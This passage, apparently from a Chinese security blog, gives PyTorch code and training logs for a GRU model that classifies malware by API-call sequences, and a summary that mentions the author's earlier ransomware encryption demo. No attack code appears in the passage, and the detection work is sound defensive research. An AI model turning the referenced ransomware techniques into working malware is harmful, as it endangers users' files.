<h1 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h1><p>   class GRUModel(nn.Module):<br>       def <strong>init</strong>(self, vocab<em>size, embed<em>dim, hidden_dim, num_classes):<br>           super(GRUModel, self).__init</em></em>()<br>           self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)<br>           self.gru = nn.GRU(embed_dim, hidden_dim, batch_first=True, bidirectional=True)<br>           self.fc = nn.Linear(hidden_dim * 2, num_classes)<br>           self.dropout = nn.Dropout(0.3)</p>
<pre><code>   def forward(self, x):
       x = self.embedding(x)  # x shape: (batch_size, seq_len, embed_dim)
       x, _ = self.gru(x)     # x shape: (batch_size, seq_len, hidden_dim * 2)
       x = x[:, -1, :]         # 取最后一个时间步的输出 (batch_size, hidden_dim * 2)
       x = self.dropout(x)
       x = self.fc(x)         # x shape: (batch_size, num_classes)
       return x
</code></pre><h1 id="超参数"><a href="#超参数" class="headerlink" title="超参数"></a>超参数</h1><p>   VOCAB_SIZE = len(apis) + 1<br>   EMBED_DIM = 50<br>   HIDDEN_DIM = 128<br>   NUM_CLASSES = num_classes<br>   LR = 0.001<br>   EPOCHS = 20</p>
<h1 id="初始化模型、损失函数和优化器"><a href="#初始化模型、损失函数和优化器" class="headerlink" title="初始化模型、损失函数和优化器"></a>初始化模型、损失函数和优化器</h1><p>   model = GRUModel(VOCAB_SIZE, EMBED_DIM, HIDDEN_DIM, NUM_CLASSES).to(DEVICE)<br>   criterion = nn.CrossEntropyLoss()<br>   optimizer = optim.Adam(model.parameters(), lr=LR)</p>
<h1 id="检查是否存在模型文件"><a href="#检查是否存在模型文件" class="headerlink" title="检查是否存在模型文件"></a>检查是否存在模型文件</h1><p>   MODEL_PATH = ‘best_gru_model.pth’<br>   if os.path.exists(MODEL_PATH):<br>       print(f”检测到已有模型文件 {MODEL_PATH}，直接加载模型进行预测…”)<br>       model.load_state_dict(torch.load(MODEL_PATH))<br>   else:</p>
<pre><code>   # 训练和验证函数
   def train_epoch(model, dataloader, criterion, optimizer):
       model.train()
       epoch_loss, correct, total = 0, 0, 0
       for sequences, labels in tqdm(dataloader, desc=&quot;Training&quot;):
           sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)
           optimizer.zero_grad()
           outputs = model(sequences)
           loss = criterion(outputs, labels)
           loss.backward()
           optimizer.step()
           epoch_loss += loss.item() * sequences.size(0)
           preds = outputs.argmax(dim=1)
           correct += (preds == labels).sum().item()
           total += labels.size(0)
       return epoch_loss / total, correct / total

   def validate_epoch(model, dataloader, criterion):
       model.eval()
       epoch_loss, correct, total = 0, 0, 0
       with torch.no_grad():
           for sequences, labels in tqdm(dataloader, desc=&quot;Validation&quot;):
               sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)
               outputs = model(sequences)
               loss = criterion(outputs, labels)
               epoch_loss += loss.item() * sequences.size(0)
               preds = outputs.argmax(dim=1)
               correct += (preds == labels).sum().item()
               total += labels.size(0)
       return epoch_loss / total, correct / total

   # 开始训练模型
   best_val_loss = float(&#39;inf&#39;)
   for epoch in range(EPOCHS):
       print(f&quot;\nEpoch &#123;epoch + 1&#125;/&#123;EPOCHS&#125;&quot;)
       train_loss, train_acc = train_epoch(model, train_loader, criterion, optimizer)
       val_loss, val_acc = validate_epoch(model, val_loader, criterion)
       print(f&quot;Train Loss: &#123;train_loss:.4f&#125;, Train Accuracy: &#123;train_acc:.4f&#125;&quot;)
       print(f&quot;Validation Loss: &#123;val_loss:.4f&#125;, Validation Accuracy: &#123;val_acc:.4f&#125;&quot;)
       if val_loss &lt; best_val_loss:
           best_val_loss = val_loss
           torch.save(model.state_dict(), MODEL_PATH)
           print(f&quot;Model saved at &#123;MODEL_PATH&#125;!&quot;)
</code></pre><h1 id="测试集预测"><a href="#测试集预测" class="headerlink" title="测试集预测"></a>测试集预测</h1><p>   model.eval()<br>   test_preds = []<br>   with torch.no_grad():<br>       for sequences in tqdm(test_loader, desc=”Testing”):<br>           sequences = sequences.to(DEVICE)<br>           outputs = model(sequences)<br>           preds = torch.softmax(outputs, dim=1).cpu().numpy()<br>           test_preds.append(preds)</p>
<p>   test_preds = np.concatenate(test_preds, axis=0)</p>
<h1 id="创建提交文件"><a href="#创建提交文件" class="headerlink" title="创建提交文件"></a>创建提交文件</h1><p>   sub = pd.DataFrame()<br>   sub[‘file_id’] = te[‘file_id’]  # 使用测试集中的 file_id 列</p>
<h1 id="将每个类别的预测概率填入"><a href="#将每个类别的预测概率填入" class="headerlink" title="将每个类别的预测概率填入"></a>将每个类别的预测概率填入</h1><p>   for i in range(NUM_CLASSES):<br>       sub[f’prob{i}’] = test_preds[:, i]</p>
<h1 id="保存为提交文件"><a href="#保存为提交文件" class="headerlink" title="保存为提交文件"></a>保存为提交文件</h1><p>   sub.to_csv(‘pytorch_gru_submission.csv’, index=False)<br>   print(“预测完成并保存至 pytorch_gru_submission.csv”)</p>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>   PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/RNN.py<br>   Using device: cuda</p>
<p>   Epoch 1/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:32&lt;00:00,  1.35it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.6978, Train Accuracy: 0.4272<br>   Validation Loss: 1.5224, Validation Accuracy: 0.4460<br>   Model saved!</p>
<p>   Epoch 2/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.5041, Train Accuracy: 0.4547<br>   Validation Loss: 1.5046, Validation Accuracy: 0.4471<br>   Model saved!</p>
<p>   Epoch 3/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:29&lt;00:00,  1.51it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4797, Train Accuracy: 0.4620<br>   Validation Loss: 1.4927, Validation Accuracy: 0.4489<br>   Model saved!</p>
<p>   Epoch 4/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.56it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4648, Train Accuracy: 0.4689<br>   Validation Loss: 1.4740, Validation Accuracy: 0.4633<br>   Model saved!</p>
<p>   Epoch 5/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.58it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4373, Train Accuracy: 0.4820<br>   Validation Loss: 1.4314, Validation Accuracy: 0.4924<br>   Model saved!</p>
<p>   Epoch 6/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s]<br>   Train Loss: 1.4187, Train Accuracy: 0.4918<br>   Validation Loss: 1.3496, Validation Accuracy: 0.5169<br>   Model saved!</p>
<p>   Epoch 7/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.4115, Train Accuracy: 0.5090<br>   Validation Loss: 1.3058, Validation Accuracy: 0.5504<br>   Model saved!</p>
<p>   Epoch 8/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s]<br>   Train Loss: 1.1772, Train Accuracy: 0.6115<br>   Validation Loss: 1.0737, Validation Accuracy: 0.6267<br>   Model saved!</p>
<p>   Epoch 9/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 1.0006, Train Accuracy: 0.6609<br>   Validation Loss: 0.9820, Validation Accuracy: 0.6598<br>   Model saved!</p>
<p>   Epoch 10/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.9129, Train Accuracy: 0.6887<br>   Validation Loss: 0.9084, Validation Accuracy: 0.6749<br>   Model saved!</p>
<p>   Epoch 11/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.8453, Train Accuracy: 0.7069<br>   Validation Loss: 0.8542, Validation Accuracy: 0.7030<br>   Model saved!</p>
<p>   Epoch 12/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7822, Train Accuracy: 0.7422<br>   Validation Loss: 0.7674, Validation Accuracy: 0.7520<br>   Model saved!</p>
<p>   Epoch 13/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7204, Train Accuracy: 0.7704<br>   Validation Loss: 0.7360, Validation Accuracy: 0.7639<br>   Model saved!</p>
<p>   Epoch 14/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.7144, Train Accuracy: 0.7717<br>   Validation Loss: 0.7184, Validation Accuracy: 0.7664<br>   Model saved!</p>
<p>   Epoch 15/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s]<br>   Train Loss: 0.6625, Train Accuracy: 0.7878<br>   Validation Loss: 0.6925, Validation Accuracy: 0.7721<br>   Model saved!</p>
<p>   Epoch 16/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.54it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.6390, Train Accuracy: 0.7931<br>   Validation Loss: 0.6748, Validation Accuracy: 0.7815<br>   Model saved!</p>
<p>   Epoch 17/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.6061, Train Accuracy: 0.8033<br>   Validation Loss: 0.6415, Validation Accuracy: 0.7927<br>   Model saved!</p>
<p>   Epoch 18/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s]<br>   Train Loss: 0.5665, Train Accuracy: 0.8278<br>   Validation Loss: 0.5947, Validation Accuracy: 0.8279<br>   Model saved!</p>
<p>   Epoch 19/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.53it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s]<br>   Train Loss: 0.5263, Train Accuracy: 0.8396<br>   Validation Loss: 0.5656, Validation Accuracy: 0.8287<br>   Model saved!</p>
<p>   Epoch 20/20<br>   Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.52it/s]<br>   Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s]<br>   Train Loss: 0.5044, Train Accuracy: 0.8467<br>   Validation Loss: 0.5578, Validation Accuracy: 0.8366<br>   Model saved!<br>   d:\chen_hao\病毒检测机器学习\RNN.py:146: FutureWarning: You are using <code>torch.load</code> with <code>weights_only=False</code> (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See <a target="_blank" rel="noopener" href="https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models">https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models</a> for more details). In a future release, the default value for <code>weights_only</code> will be flipped to <code>True</code>. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via <code>torch.serialization.add_safe_globals</code>. We recommend you start setting <code>weights_only=True</code> for any use case where you don’t have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.<br>     model.load_state_dict(torch.load(‘best_gru_model.pth’))<br>   Testing: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 51/51 [00:25<00:00,  2.01it/s] 
   预测完成并保存至 pytorch_gru_submission.csv
   PS D:\chen_hao\病毒检测机器学习><br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212143434312.png image-20241212123845251 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212144205267.png image-20241212144205267 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241213005217419.png image-20241213005217419 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   file_id,prob0,prob1,prob2,prob3,prob4,prob5,prob6,prob7<br>   1,0.06448878,0.002397979,0.9028775,0.0013381493,0.00045697886,0.0020659335,0.003058874,0.023315739<br>   2,0.9813138,8.656157e-05,0.0029583538,0.0011351788,0.00028997194,0.006586187,0.0018473516,0.005782577<br>   3,0.99163276,5.5359196e-05,0.0027402057,0.0004632939,0.000118531985,0.0013870831,0.00072588393,0.0028768326<br>   4,0.021272896,0.011765718,0.024904,0.076123476,0.015064285,0.025066515,0.17768894,0.6481142<br>   5,0.904939,0.00073774875,0.04147379,0.002916103,0.0005452043,0.0022994527,0.007011477,0.040077265<br>   6,0.0021798164,0.0007873667,0.0014384006,0.0027823928,0.00244751,0.9728891,0.011387657,0.006087801<br>   7,0.0068255765,0.017928587,0.0011721165,0.5918627,0.028887965,0.08608816,0.065764345,0.20147054<br>   8,0.256366,0.00392755,0.17083807,0.03653748,0.0030841657,0.014288423,0.043775067,0.4711833<br>   9,0.036793254,0.010180762,0.07269347,0.028041216,0.007907337,0.014224959,0.1945642,0.6355948<br>   10,0.25146127,0.0009808545,0.0032455756,0.375254,0.008948095,0.1938656,0.042228147,0.124016486<br>   11,0.00095530774,0.09089262,0.001956982,0.0021283366,0.0098222485,0.88708365,0.004995707,0.0021652123<br>   12,0.9000948,0.00055806845,0.07364376,0.0017178208,0.00039910257,0.0030469508,0.0031312718,0.017408215<br>   13,0.9858329,7.062489e-05,0.002319975,0.00074456446,0.00021577052,0.0051714894,0.0013318722,0.0043128696<br>   14,0.71485704,0.0018635483,0.1835684,0.0046869554,0.00093834405,0.0039504743,0.012158039,0.07797725<br>   15,0.95209205,0.00034266696,0.024804827,0.0013410876,0.00033840715,0.002777113,0.0031649894,0.015138777<br>   16,0.9988642,6.826462e-05,0.0005704778,5.0490657e-05,5.821846e-05,1.5237126e-05,5.5164932e-05,0.00031797035<br>   17,0.00090827956,0.0009387416,0.0012451294,0.00543124,0.003330927,0.96512026,0.014691722,0.008333769<br>   18,0.01809039,0.0010136849,0.0009486259,0.55183834,0.017171165,0.17679921,0.012343813,0.22179477<br>   19,0.9777029,0.00014269094,0.0092709325,0.0011368245,0.000268385,0.003403238,0.0015272632,0.006547669<br>   20,0.9926167,4.7670434e-05,0.002156556,0.00042129072,0.000109387,0.0013140069,0.0006860488,0.0026483978<br>   21,0.9420716,0.00025259246,0.010330827,0.0035953792,0.0003313114,0.013363041,0.002719807,0.027335435<br>   22,0.010564044,0.013456773,0.013810868,0.10937901,0.023766087,0.07066154,0.2242378,0.53412384<br>   23,0.0074043795,0.0237848,0.8829586,0.016059525,0.012664877,0.015524606,0.0027832955,0.03881999<br>   24,0.7460677,0.0016432973,0.16402717,0.0043358603,0.0008404788,0.003432122,0.010673889,0.06897949<br>   ```</p>
<h4 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h4><ol>
<li><strong>实验结论</strong>：<ul>
<li><strong>勒索病毒</strong>：设计了一个简单的勒索病毒Demo，揭示其文件加密与解密原理。</li>
<li><strong>机器学习</strong>：使用LightGBM结合TF-IDF特征，模型性能优秀，适合快速检测。</li>
<li><strong>深度学习</strong>：GRU模型对复杂API序列分类效果更优，适合进一步研究。</li>
</ul>
</li>
<li><strong>优化方向</strong>：<ul>
<li>引入更复杂的注意力机制，加强深度学习模型对序列数据的理解。</li>
<li>数据增强，扩展训练数据多样性，提升模型泛化能力。</li>
<li>结合机器学习和深度学习结果进行模型融合，进一步提升检测与分类性能。</li>
</ul>
</li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="https://raw.githubusercontent.com/moyuan10086/photo/main/alipay.jpg" alt="moyuan 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="https://raw.githubusercontent.com/moyuan10086/photo/main/Wechat.jpg">
      </div>
  </div>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/" rel="prev" title="CSRF攻击与防护">
                  <i class="fa fa-angle-left"></i> CSRF攻击与防护
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
